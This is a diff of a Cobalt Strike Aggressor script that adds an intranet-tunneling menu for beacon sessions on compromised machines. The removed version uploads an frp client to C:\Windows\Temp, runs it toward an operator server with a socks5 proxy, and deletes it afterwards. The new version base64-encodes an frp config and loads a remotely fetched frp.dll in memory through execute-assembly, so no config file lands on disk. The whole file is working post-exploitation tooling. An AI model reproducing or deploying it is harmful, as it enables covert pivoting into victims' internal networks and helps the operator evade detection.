@@ -1,54 +1,39 @@
+include(script_resource("config.cna"));
 menu "☆ 内网穿透" {
-	menu "Frp (指定参数版 ini不落地)" {
-		item "上传 frpc" {
-			blog($1, "\c9=========== 上传 frpc ==========");
-			$bid = $1;
-			$dialog = dialog("上传frpc", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &frp_upload);
-			dialog_description($dialog,"frp指定参数版（无需frpc.ini落地）。项目地址：https://github.com/vanboomqi/sfrp");
-			drow_text($dialog, "UploadPath",  "上传路径: ");
-			dbutton_action($dialog, "上传");
-			dialog_show($dialog);
-		}
-		sub frp_upload {
-			bcd($bid, $3['UploadPath']);
-			if (-is64 $bid['id']) {
-			bupload($bid, script_resource("/scripts/IntrAgent/x64/sfrpc.exe"));
-			}else{
-			bupload($bid, script_resource("/scripts/IntrAgent/x86/sfrpc.exe"));
-			}
-		}
-		item "运行 frpc" {
-			blog($1, "\c9=========== 运行 frpc ==========");
-			$bid = $1['@'];
-			$Dialog = dialog("运行frpc",%(ip => "x.x.x.x", port => "7000",bid => $bid),&frpc_run);
-			dialog_description($Dialog, "运行frpc，指定参数即可，socks5端口为1080。");
-			drow_text($Dialog, "ip", "ip: ");
-			drow_text($Dialog, "port", "port: ");
-			drow_combobox($Dialog, "protocol", "protocol: ", @("tcp","quic","kcp"));
-			dbutton_action($Dialog, "运行");
-			dialog_show($Dialog);
-		}
-		sub frpc_run {
-			local('$Name $port $protocol');
-			$Name = $3['ip'];
-			$port = replace($3['port'], "\"", "");
-			$protocol = replace($3['protocol'], "\"", "");
-			bshell($bid, "sfrpc.exe -t  $+ $Name -p  $+ $port --protocol  $+ $protocol");
-		}
-		item "停止 frpc" {
-			blog($1, "\c9=========== 停止 frpc ==========");
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "taskkill -f /im sfrpc.exe");
-			}
-		}
-		item "删除 frpc" {
-			blog($1, "\c9=========== 删除 frpc ==========");
-			local('$bid');
-			foreach $bid ($1){
-				bshell($1, "taskkill -f /im sfrpc.exe & del /f /s /q sfrpc.exe");
-			}
-		}
-	}
+    item "frp" {
+        blog($1, "\c9=========== 配置并运行 frp ==========");
+        $bid = $1['@'];
+        $Dialog = dialog("配置并运行 frp", %(ip => "", port => "7000", socks5_port => "1080", protocol => "tcp", bid => $bid), &run_frp);
+        dialog_description($Dialog, "配置并运行 frp，指定 IP、端口和协议。");
+        drow_text($Dialog, "ip", "IP: ");
+        drow_text($Dialog, "port", "Port: ");
+        drow_text($Dialog, "socks5_port", "Socks5 Port: ");
+        drow_combobox($Dialog, "protocol", "Protocol: ", @("tcp", "kcp", "quic"));
+        dbutton_action($Dialog, "运行");
+        dialog_show($Dialog);
+    }
+}
 
+sub run_frp {
+    local('$ip $port $socks5_port $protocol $config $base64Config $exe $param');
+    $ip = $3['ip'];
+    $port = $3['port'];
+    $socks5_port = $3['socks5_port'];
+    $protocol = $3['protocol'];
+
+    # 创建配置文件内容
+    $config = "[common]\nserver_addr = $ip\nserver_port = $port\nprotocol = $protocol\n\n[socks5_proxy]\ntype = tcp\nremote_port = $socks5_port\nplugin = socks5\n";
+
+    # 将配置文件内容转换为 Base64
+    $base64Config = base64_encode($config);
+
+    # 准备要执行的程序路径和参数
+    $exe = script_resource("/scripts/IntrAgent/x64/DInvoke.exe");
+    $param = "--url " . $url . "/IntrAgent/x64/frp.dll --config " . $base64Config;
+
+    # 打印最终的执行命令
+    blog2($bid, "最终执行的命令: $exe $param");
+
+    # 执行程序
+    bexecute_assembly!($bid, $exe, $param);
 }
